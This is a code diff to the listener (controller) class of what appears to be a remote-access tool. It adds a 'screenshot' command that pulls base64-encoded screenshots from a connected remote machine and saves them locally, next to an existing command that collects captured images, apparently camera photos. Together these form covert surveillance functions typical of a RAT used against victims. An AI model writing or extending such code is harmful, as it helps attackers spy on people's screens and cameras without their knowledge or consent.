@@ -70,6 +70,15 @@ class Listener:
             with open(f"images/photo_{i+1}.png", "wb") as f:
                 f.write(img_bytes)
         return f"[+] {len(images)} images saved in directory images!"
+    
+    def screenshot(self, images):
+        if not os.path.exists("screenshots"):
+            os.makedirs("screenshots")
+        for i, img_data in enumerate(images):
+            img_bytes = base64.b64decode(img_data)
+            with open(f"screenshots/screenshot_{i+1}.png", "wb") as f:
+                f.write(img_bytes)
+        return f"[+] {len(images)} screenshots saved in directory screenshots!"
             
     def cleanup(self):
         print("[+] Closing connection...")
@@ -112,6 +121,14 @@ class Listener:
             elif command[0] == "capture_image":
                 if isinstance(result, list):
                     print(self.save_images(result))
+                else:
+                    print(result)
+                    
+            elif command[0] == "screenshot":
+                self.send(data)
+                result = self.receive()
+                if isinstance(result, list):
+                    print(self.screenshot(result))
                 else:
                     print(result)
                     
